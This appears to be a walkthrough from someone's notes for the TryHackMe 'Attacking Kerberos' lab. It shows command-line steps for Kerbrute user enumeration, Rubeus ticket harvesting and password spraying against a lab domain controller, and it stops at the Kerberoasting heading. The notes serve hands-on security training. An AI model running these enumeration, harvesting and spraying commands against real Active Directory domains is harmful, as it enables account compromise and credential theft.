# Attacking Kerberos

**Room Link:** [https://tryhackme.com/room/attackingkerberos](https://tryhackme.com/room/attackingkerberos)



## Presteps for Lab

### Kerbrute Installation &#x20;

&#x20;Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute && chmod +x kerbrute 
```

### Download wordlist

```
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt
```

### Add hostname to host file

```
echo $VICTIM CONTROLLER.local  >> /etc/hosts
cat /etc/hosts
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

## Enumeration w/ Kerbrute

This will brute force user accounts from a domain controller using a supplied wordlist

```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

## Harvesting & Brute-Forcing Tickets w/ Rubeus

Login with provided credentials

**Kali**

```
ssh Administrator@$VICTIM
Password: P@$$W0rd
```

Harvest tickets with Rubeus

**Victim**

```
cd Downloads
Rubeus.exe harvest /interval:30
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

**Victim**

```
echo $VICTIM CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
cd Downloads
Rubeus.exe brute /password:Password1 /noticket
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

## Kerberoasting w/ Rubeus & Impacket
